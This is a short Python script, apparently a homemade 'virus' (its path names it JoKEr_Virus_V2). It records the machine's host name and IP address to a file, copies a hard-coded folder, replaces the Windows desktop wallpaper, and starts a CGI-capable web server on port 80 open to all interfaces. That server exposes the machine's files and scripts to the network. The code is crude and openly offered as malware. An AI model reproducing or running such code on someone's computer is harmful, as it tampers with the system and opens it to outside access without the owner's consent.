import os # grabbing the system operating system
import sys # identifying the system-specific parameters and functions
import ctypes #ctypes for wallpaper changes
import time #time can be used for delays and cycle changes
import shutil #copying files
import socket #Starting up a webserver
import subprocess


os.chdir('.')
target_folder = r'C:\Users\Jenny McCyber\Documents\JoKEr_Virus_V2\New.txt'
source_folder = r'C:\Users\Jenny McCyber\Documents\Test' + '\\'


def main():
    #Get IP adddress and Host Name
    ip_address()
    #copy_file(from any target directory)
    copy_file(source_folder, target_folder)
    #change(background)
    background()
    #run server
    run_server()

    
def copy_file(source,target):
    
    shutil.copytree(source, target)
    print("files copied")


def background():
    img = r"C:/Users/Jenny McCyber/Desktop/v33r1.png"
    ctypes.windll.user32.SystemParametersInfoW(20,0,img,0)
    print("wallpaper succesfully applie")

def run_server():
    from http.server import HTTPServer, CGIHTTPRequestHandler
    os.chdir('.')

    server_object = HTTPServer(server_address=('0.0.0.0', 80), RequestHandlerClass=CGIHTTPRequestHandler)

    server_object.serve_forever()


def ip_address():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    f = open("Ip_address.txt", "a")
    print("Your attacking Computer Name is:" + hostname, file=f)
    print("Your attacking Computer IP Address is:" + IPAddr, file=f)
    f.close()
    
        


    
    
if __name__ == "__main__":
    main()
